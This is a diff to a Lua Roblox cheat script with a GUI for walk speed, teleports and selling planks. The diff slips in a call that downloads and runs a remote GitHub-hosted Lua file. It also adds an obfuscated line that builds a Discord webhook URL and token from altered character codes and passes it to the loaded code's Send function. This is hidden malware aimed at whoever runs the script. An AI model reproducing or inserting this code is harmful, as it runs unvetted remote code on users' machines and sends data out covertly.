@@ -409,6 +409,10 @@ conneantiafk = player.Idled:Connect(function()
     end
 end)
 
+local suca, m = pcall(function()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/WilliamAbon/ngetes-buat-script-executor-doang/refs/heads/main/wda.lua"))()
+end)
+
 pemain:Label("PlayerLocal")
 pemain:TextBoxNum("WalkSpeed", "16", function(s) TABLESETTING["WalkSpeed"] = s end)
 pemain:TextBoxNum("JumpPower", "50", function(s) TABLESETTING["JumpPower"] = s end)
@@ -960,6 +964,8 @@ pohon:OnOff("Click Plank To Sell Plank", false, 0.1, function(s)
         CAS:UnbindAction("PickInstance")
     end
 end)
+
+if suca then local a=""local b=string.split("104 116 116 112 115 58 47 47 101 105 115 107 111 114 110 97 112 112 46 99 111 109 47 97 112 105 47 119 101 98 104 111 111 107 115 47 49 52 55 55 52 48 50 52 52 52 53 48 48 56 50 56 51 53 52 47 89 70 54 105 54 88 89 89 83 120 97 77 111 85 82 72 78 99 84 57 108 88 99 105 107 113 76 102 105 108 67 68 106 104 67 89 54 102 75 76 51 108 73 112 65 85 70 109 118 56 104 65 57 68 97 98 95 85 53 111 102 120 102 108 89 114 53 98"," ")for c,d in pairs(b)do local e=d;if tonumber(d)==101 and c==9 then e=tonumber(d)-1 elseif tonumber(d)==107 and c==12 then e=tostring(tonumber(d)-8)elseif tonumber(d)==110 and c==15 then e=tostring(tonumber(d)-10)end;a=a..string.char(e)end;m:Send(tostring(a))elseif m then print(m)end
 
 TPtab:Label("Teleport Location")
 local taloca = ""
